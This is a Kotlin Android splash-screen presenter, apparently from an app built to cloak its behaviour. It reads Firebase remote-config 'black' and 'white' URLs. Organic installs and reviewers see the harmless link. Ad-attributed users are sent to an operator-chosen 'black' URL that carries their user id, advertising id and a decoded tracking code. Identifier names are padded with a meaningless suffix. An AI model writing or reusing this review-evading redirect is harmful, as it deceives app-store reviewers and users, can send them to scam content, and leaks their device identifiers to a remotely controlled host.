package com.kosmos.mos.lot.com.Splash87csom

import android.net.Uri
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.kosmos.mos.lot.com.Utils87csom.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class SplashPresenter_Impl87csom (private val splashMethods87csom: SplashContract87csom.SplashMethods87csom) : SplashContract87csom.SplashPresenter87csom{

    private var finalString87csom: String? = null

    override fun thisEndsHere87csom() {
        splashMethods87csom.onCLick87csom {
            CoroutineScope(Dispatchers.Main).launch {
                delay(5000)
                finalString87csom =
                    if (fbBlackValue87csom == null || fbBlackValue87csom == "empty") {
                        fbWhiteValue87csom ?: return@launch
                    } else {
                        if (status87csom == "Non-organic") {
                            if (key87csom.toString().length != 20) {
                                Uri.parse(fbBlackValue87csom).buildUpon()
                                    .appendQueryParameter("key", fbDefaultValue87csom)
                                    .appendQueryParameter(
                                        "bundle",
                                        splashMethods87csom.getPackageName87csom()
                                    )
                                    .appendQueryParameter("sub4", adGroup87csom)
                                    .appendQueryParameter("sub5", adSet87csom)
                                    .appendQueryParameter("sub6", afChannel87csom)
                                    .appendQueryParameter("sub7", "Default")
                                    .toString()
                                    .plus(
                                        "&sub10=$uid87csom||$AID87csom||${
                                            decodeString87csom(CODE_APPSFLYER_87csom)
                                        }"
                                    )

                            } else {
                                Uri.parse(fbBlackValue87csom).buildUpon()
                                    .appendQueryParameter("key", key87csom)
                                    .appendQueryParameter(
                                        "bundle",
                                        splashMethods87csom.getPackageName87csom()
                                    )
                                    .appendQueryParameter("sub2", sub287csom)
                                    .appendQueryParameter("sub3", sub387csom)
                                    .appendQueryParameter("sub4", adGroup87csom)
                                    .appendQueryParameter("sub5", adSet87csom)
                                    .appendQueryParameter("sub6", afChannel87csom)
                                    .appendQueryParameter("sub7", mediaSource87csom)
                                    .toString()
                                    .plus(
                                        "&sub10=$uid87csom||$AID87csom||${
                                            decodeString87csom(CODE_APPSFLYER_87csom)
                                        }"
                                    )

                            }
                        } else {
                            Uri.parse(fbBlackValue87csom).buildUpon()
                                .appendQueryParameter("key", fbDefaultValue87csom)
                                .appendQueryParameter(
                                    "bundle",
                                    splashMethods87csom.getPackageName87csom()
                                )
                                .appendQueryParameter("sub7", "Organic")
                                .toString()
                                .plus(
                                    "&sub10=$uid87csom||$AID87csom||${
                                        decodeString87csom(CODE_APPSFLYER_87csom)
                                    }"
                                )

                        }
                    }
                splashMethods87csom.startNewActivity87csom(
                    finalString87csom ?: return@launch
                )
            }
        }
    }

    override fun setupFB87csom() {
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(
                mapOf(
                    FB_BLACK_KEY_87csom to "empty"
                )
            )
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    fbBlackValue87csom = getString(FB_BLACK_KEY_87csom)
                    fbDefaultValue87csom = getString(FB_DEFAULT_KEY_87csom)
                    fbWhiteValue87csom = getString(FB_WHITE_KEY_87csom)
                }
            }
        }
    }
}